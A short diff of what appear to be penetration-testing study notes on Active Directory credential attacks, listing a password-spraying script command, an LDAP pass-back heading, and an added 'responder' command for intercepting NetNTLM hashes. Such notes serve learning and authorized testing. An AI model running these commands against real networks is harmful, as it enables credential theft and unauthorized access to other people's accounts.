@@ -2,5 +2,8 @@ Password Spraying
 python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
 
 LDAP Pass-Back Attack (Rare attack scenario)
+
 Intercepting NetNTLM
+sudo responder -I tun0
+
 
